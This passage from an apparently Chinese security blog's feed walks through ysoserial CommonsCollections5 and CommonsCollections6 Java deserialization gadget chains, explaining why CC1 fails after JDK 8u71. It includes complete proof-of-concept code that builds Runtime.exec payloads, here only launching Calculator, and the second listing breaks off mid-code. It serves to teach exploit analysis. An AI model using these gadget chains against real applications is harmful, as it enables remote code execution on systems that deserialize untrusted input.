<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 利用反射修改 BadAttributeValueExpException 中的 val 为 tiedMapEntry</span></span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> bad.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">val.set(bad, tiedMapEntry);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205451.png" alt="image-20210701204112054"></p>
<p>完整代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/30 21:05</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">                TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">                    LazyMap.get()</span></span><br><span class="line"><span class="comment">                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Requires:</span></span><br><span class="line"><span class="comment">		commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">This only works in JDK 8u76 and WITHOUT a security manager</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>), <span class="comment">// 隐藏错误信息</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//使用 LazyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"><span class="comment">//        tiedMapEntry.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 利用反射修改 BadAttributeValueExpException 中的 val 为 tiedMapEntry</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> bad.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(bad, tiedMapEntry);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        // 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(bad);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化读取 out.bin 文件</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p>天下大木头师傅的 <a href="https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#55fcdbc0">https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#55fcdbc0</a></p>
]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>漏洞原理</tag>
      </tags>
  </entry>
  <entry>
    <title>Java ysoserial学习之CommonsCollections6(三)</title>
    <url>/2021/06/27/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections6(%E4%B8%89)/</url>
    <content><![CDATA[<blockquote>
<p>  争取明年有一个上千star的项目</p>
</blockquote>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在上一篇通过 P牛和 ysoserial 项目分析了CommonsCollections1这条利用链和其中的TransformedMap、LazyMap原理。</p>
<p>但是在 Java 8u71以后，这个利用链不能再利用了，主要原因是 <code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code> 的逻辑变化了。</p>
<p>CommonsCollections6 解决了高版本Java的利用问题，一起来学习下吧。</p>
<p>本文CommonsCollections6利用链的限制条件：</p>
<p>​	JDK版本：暂无限制、 CommonsCollections 3.1 - 3.2.1</p>
<p>实验环境:</p>
<p>​	JDK 1.8.0_261 、Commons-Collections 3.2.1 </p>
<h2 id="0x01-AnnotationInvocationHandler-readObject"><a href="#0x01-AnnotationInvocationHandler-readObject" class="headerlink" title="0x01 AnnotationInvocationHandler#readObject"></a>0x01 AnnotationInvocationHandler#readObject</h2><p>学习 CommonsCollections6 之前，先来看看 <code>AnnotationInvocationHandler#readObject</code>具体改变了什么?</p>
<p>在 Java 8u71 之前，当 <code>Object var6 = this.memberValues.get(var4);</code> var4 的值为<code>entrySet</code>时，这时 <code>this.memberValues</code> 是一个<code>LazyMap</code>对象，里面的值也就是在上一节我们构造好的transformers的数组<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215158.png" alt="image-20210627131532093"></p>
<p>只有这时才会继续执行<code>LazyMap#get</code>方法，进而触发<code>transform</code>方法，执行命令。<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215208.png" alt="image-20210627130306085"></p>
<p>而在 Java 8u71 之后（本文以JDK 1.8.0_261为例），当 <code>Object var6 = this.memberValues.get(var4);</code> var4 的值为<code>entrySet</code>时，这时 <code>this.memberValues</code> 却是一个<code>LinkedHashMap</code>对象，根本不是我们构造的 <code>LazyMap</code> <img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215214.png" alt="image-20210627132502384"></p>
<p>主要就是因为在Java 8u71之前的<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>中，首先调用默认的反序列化方法<code>defaultReadObject</code>获取Map对象；</p>
<p>而 Java 8u71之后，修改了逻辑，不再直接使用反序列化得到Map对象，而是新建了一个<code>LinkedHashMap</code>对象，并将原来的键值添加进去，后续对Map的操作都是基于这个新的<code>LinkedHashMap</code>对象。<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215221.png" alt="image-20210627134340813"></p>
<p><code>LinkedHashMap</code>无法获得<code>entrySet</code>的内容，所以当 <code>Object var6 = this.memberValues.get(var4);</code> var4 的值为<code>entrySet</code>时，会报下面这个错误，无法完成后续操作。</p>
<p><code>java.lang.annotation.Target missing element entrySet</code><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215227.png" alt="image-20210627134652820"></p>
<h2 id="0x02-利用链"><a href="#0x02-利用链" class="headerlink" title="0x02 利用链"></a>0x02 利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">	    java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashSet.readObject()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.put()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    by @matthias_kaiser</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>可以看到后半段从<code>LazyMap.get()</code>到结束都和CC1一样，这里就不分析了，具体可以看上篇文章**<a href="https://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484514&idx=1&sn=2552ec324c1395c9c3c8b9f78cbb4908&chksm=c2829d7bf5f5146d1d2dd0531344262a31b44f27d8c56c7465a9d0555c8773bc096424a0dd53&scene=0&xtrack=1#rd">Java ysoserial学习之CommonsCollections1(二)</a>**。</p>
<p><code>AnnotationInvocationHandler</code>在前面起到的作用是来触发<code>LazyMap#get</code>函数，所以我们接下来就是要重新找一个可以触发该函数的对象。这个对象满足</p>
<ul>
<li><p>类可序列化，类属性有个可控的Map对象或Object</p>
</li>
<li><p>该类的类函数上有调用这个Map.get的地方</p>
</li>
</ul>
<p>从这里可以看到解决<strong>Java高版本利用</strong>问题，实际上就是在找是否还有其他调用 <strong>LazyMap#get()</strong> 的地方。</p>
<h3 id="2-1-TiedMapEntry"><a href="#2-1-TiedMapEntry" class="headerlink" title="2.1 TiedMapEntry"></a>2.1 TiedMapEntry</h3><p>在 ysoserial 项目中的 CC6链 是找了<strong>TiedMapEntry</strong>类来代替<strong>AnnotationInvocationHandler</strong>的作用。</p>
<p>直接进入<code> org.apache.commons.collections.keyvalue.TiedMapEntry</code>文件中, <code>TiedMapEntry</code>实现了<code>Serializable</code>接口，可以进行序列化操作，很好，构造方法接受一个Map，可以被我们控制，那么就可以将<code>LazyMap</code>对象放入，<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215234.png" alt="image-20210627162448731"></p>
<p>在<code>TiedMapEntry#getValue</code>方法中调用了<code>map.get</code>方法，可以执行<code>LazyMap.get</code>，进而执行<code>transform</code>方法，执行任意方法，完美。<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215239.png" alt="image-20210627162759746"></p>
<p>测试一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>), <span class="comment">// 隐藏错误信息</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//使用 LazyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 上面还是使用CC1构造的，不变， 这里创建 TiedMapEntry 测试一下</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line">        tiedMapEntry.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215244.png" alt="image-20210627163526597"></p>
<h3 id="2-2-HashMap"><a href="#2-2-HashMap" class="headerlink" title="2.2 HashMap"></a>2.2 HashMap</h3><p>下面就是找一个能自动调用 <code>TiedMapEntry#getValue</code>的地方了。</p>
<p>然后继续向上看利用链,<code> org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</code> ysoserial 这里通过<code>TiedMapEntry.hashCode()</code>方法来调用<code>getValue</code>方法（然后我们也不难发现<code>TiedMapEntry#toString</code>和<code>TiedMapEntry#equals</code>方法也调用了<code>getValue()</code>方法，但它不是CC6的猪角，这又是两条链CC5、CC7的事了）<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215252.png" alt="image-20210627202424491"></p>
<p>看到 <strong>hashCode</strong>,记忆好的应该还记得在<strong>Java ysoserial学习之URLDNS(一)<strong>中，它可是猪角，回顾一下</strong>URLDNS</strong>触发流程</p>
<blockquote>
<ol>
<li>将URL对象作为key放入hashMap中，将其序列化发送给目标机器</li>
<li>如果目标机器存在反序列化漏洞，那么会执行<code>HashMap.readObject()</code> 将数据反序列化</li>
<li>在反序列化期间，为了还原hashmap的内容，会调用 <code>hash()</code> 方法，而<code>hash()</code>函数会调用传入参数的 <code>hashCode()</code>方法</li>
<li>当URL 对象的 <code>hashCode</code>属性值为 <code>-1</code> 时会调用 <code>handler.hashCode()</code>方法，而这个方法会进行一次DNS查询。</li>
</ol>
</blockquote>
<p>重点看第三点，非常好，现在我们大概是找到了自动触发<code>TiedMapEntry#getValue</code>的地方了，Code一下，新建一个<code>hashMap</code>对象将<code>tiedMapEntry</code>作为<code>key</code>传入<code>hashMap</code><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215259.png" alt="image-20210627171836200"></p>
<p>然后就会发现，确实弹出了<strong>一个</strong>计算器，我以为到这里就结束了，结果是我在想屁吃，O(∩_∩)O哈哈~</p>
<p>这里弹出的计算器真的是<strong>反序列化时</strong>执行的吗？只会弹<strong>一个</strong>吗？</p>
<p>肯定不是啊，<strong>hashMap.put(tiedMapEntry, “yhy”);</strong> put是就会弹一个啊，按理说反序列化时也会执行命令再弹出一个计算机，总共应该<strong>两个</strong>，这里只弹出一个，在 <strong>hashMap.put</strong>时下断点，然后在<code>HashMap#readObject</code>方法中的<code>putVal(hash(key), key, value, false, false);</code>也下一个断点，<code>LazyMap#get</code>方法也下一个，之后开启Debug模式</p>
<p>点击绿色箭头直接从<code>hashMap.put</code>跳转到<code>LazyMap#get</code>,然后单步调试，第一次确实执行了<code>factory.transform</code>触发我们自定义的方法，弹出了计算器，注意这里的<strong>map</strong>是空的<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215304.png" alt="image-20210627195100261"></p>
<p>接着点击绿色箭头从<code>ois.readObject();</code>跳转到<code>LazyMap#get</code>，之后单步调试就会发现，这一次没有执行<code>factory.transform(key)</code>,<code>map.containsKey(key)</code>不再为<code>false</code>了，这一次 <strong>map</strong> 中有了一个key，不在为空了，<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215309.png" alt="image-20210627195210201"></p>
<p>里面的key正是我们放进去的<code>TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,&quot;yhy&quot;);</code> ，这里说明当第一次利用<code>hashMap.put(tiedMapEntry, &quot;yhy&quot;);</code>时调用到了<code>HashMap#hash(key)</code></p>
<blockquote>
<p>  注：这里的yhy并不是key，而是value，改这个值并不会影响if的判断，第一次new TiedMapEntry(outerMap,”yhy”)的才是key</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215314.png" alt="image-20210627195758963">这里对后续反序列化时产生了影响，导致 map.containsKey(key) &#x3D;&#x3D; true，不进入if判断中，无法执行<code>transform</code>方法执行任意方法。</p>
<p>解决办法是把<strong>map</strong>中的<strong>key</strong>去除,这一次确实执行了两次，可以debug验证一下，第二次确实是在反序列化阶段执行的<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215321.png" alt="image-20210627200400851"></p>
<p>细心的朋友可能发现了，这里和开头写的利用链不一样，怎么就结束了，明明还有一步 <code>java.util.HashSet.readObject()</code>没有用到。</p>
<p>其实这条利用链是和P牛在代码审计知识星球-Java安全漫谈系列中简化后的CC6链是一样的，我是在看到<strong>HashCode</strong>时联想到了<strong>URLDNS</strong>那条链中的相关知识，然后又参考P牛的文章才把这条链搞懂。^_^</p>
<p>在P牛的代码中 <a href="https://github.com/phith0n/JavaThings/blob/master/general/src/main/java/com/govuln/deserialization/CommonsCollections6.java">https://github.com/phith0n/JavaThings/blob/master/general/src/main/java/com/govuln/deserialization/CommonsCollections6.java</a> 有一点和上述不一样</p>
<p>P牛多定义了<code>Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;</code>,然后</p>
<p><code>Transformer transformerChain = new ChainedTransformer(fakeTransformers);</code>加入的是多定义的<code>fakeTransformers</code>数组，精心构造的要执行命令的数组在<strong>remove</strong>函数前后通过反射加入了<strong>transformerChain</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f.set(transformerChain, transformers);</span><br></pre></td></tr></table></figure>

<p>这样的好处是</p>
<blockquote>
<p>  为了避免本地调试时触发命令执行，我构造LazyMap的时候先用了一个人畜无害的 fakeTransformers 对象，等最后要生成Payload的时候，再把真正的 transformers 替换进去。</p>
</blockquote>
<p>完整代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/27 11:41</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">	    java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashMap.readObject()     这里不同</span></span><br><span class="line"><span class="comment">                java.util.HashMap.put()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 人畜无害的Transformer数组</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>), <span class="comment">// 隐藏错误信息</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将 fakeTransformers 数组存入 ChainedTransformer 这个继承类</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//使用 LazyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> 